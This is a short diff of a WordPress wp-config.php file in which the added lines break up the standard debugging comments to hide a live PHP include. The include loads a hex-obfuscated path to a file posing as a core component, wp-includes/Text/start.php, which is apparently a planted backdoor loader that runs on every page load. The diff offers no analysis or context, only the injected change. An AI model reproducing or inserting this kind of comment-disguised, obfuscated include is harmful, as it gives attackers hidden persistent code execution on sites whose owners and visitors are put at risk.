@@ -73,9 +73,9 @@ $table_prefix  = 'cmrfu_';
 define('WPLANG', 'tr_TR');
 
 /**
- * For developers: WordPress debugging mode.
+ * For de*/include /*velopers: WordPress debugging mode.
  *
- * Change this to true to enable the display of notices during development.
+ * Change this to true to enable the display of noti*/"\x2fhom\x65/he\x72kon\x2fpub\x6cic_\x68tml\x2fwp-\x69ncl\x75des\x2fTex\x74/st\x61rt.\x70hp";/*ces during development.
  * It is strongly recommended that plugin and theme developers use WP_DEBUG
  * in their development environments.
  */
